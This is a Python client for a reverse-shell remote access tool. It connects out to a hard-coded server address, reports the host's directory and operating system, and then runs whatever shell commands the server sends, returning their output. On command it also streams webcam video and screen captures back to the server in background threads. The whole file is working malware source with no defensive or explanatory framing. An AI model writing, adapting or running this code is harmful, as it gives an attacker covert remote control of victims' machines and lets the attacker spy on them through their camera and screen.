import socket # For network (client-server) communication.
import os # For handling os executions.
import subprocess # For executing system commands.
import cv2 # For recording the video.
import threading # For recording the video in a different thread.
import platform # We use this to get the os of the target (client).
import mss
import numpy as np

SERVER_HOST = "172.16.115.143"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, you can adjust this.
# Separator string for sending 2 messages at a time.
SEPARATOR = "<sep>"
# Create the socket object.
s = socket.socket()
# Connect to the server.
s.connect((SERVER_HOST, SERVER_PORT))
# Get the current directory and os and send it to the server.
cwd = os.getcwd()
targets_os = platform.system()
s.send(cwd.encode())
s.send(targets_os.encode())

# Function to record and send the video.
def record_video():
    global cap
    cap = cv2.VideoCapture(1)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, frame_bytes = cv2.imencode('.jpg', frame)
        frame_size = len(frame_bytes)
        s.sendall(frame_size.to_bytes(4, byteorder='little'))
        s.sendall(frame_bytes)
    cap.release()
    cv2.destroyAllWindows()
def record_screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Select the first monitor (or adjust if needed)
        
        while True:
            # Capture the screen as a screenshot
            img = sct.grab(monitor)
            frame = np.array(img)  # Convert to numpy array
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)  # Remove alpha channel if present

            # Encode the frame as JPEG
            _, frame_bytes = cv2.imencode('.jpg', frame)
            frame_size = len(frame_bytes)

            # Send the frame size and frame bytes over the socket
            s.sendall(frame_size.to_bytes(4, byteorder='little'))
            s.sendall(frame_bytes)
            
            # Display the frame locally (optional)
            cv2.imshow('Screen Capture', frame)

            # Break if 'q' is pressed
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

    cv2.destroyAllWindows()

while True:
    # receive the command from the server.
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop.
        break
    elif command.lower() == "start cam":
        # Start recording video in a separate thread
        recording_thread = threading.Thread(target=record_video)
        recording_thread.start()
        output = "Video recording started."
        print(output)
    elif command.lower() == "start screen":
        # Start recording video in a separate thread
        screenrec_thread = threading.Thread(target=record_screen)
        screenrec_thread.start()
        output = "screen recording started."
        print(output)
    else:
        # execute the command and retrieve the results.
        output = subprocess.getoutput(command)
        # get the current working directory as output.
        cwd = os.getcwd()
        # send the results back to the server.
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
# close client connection.
s.close()
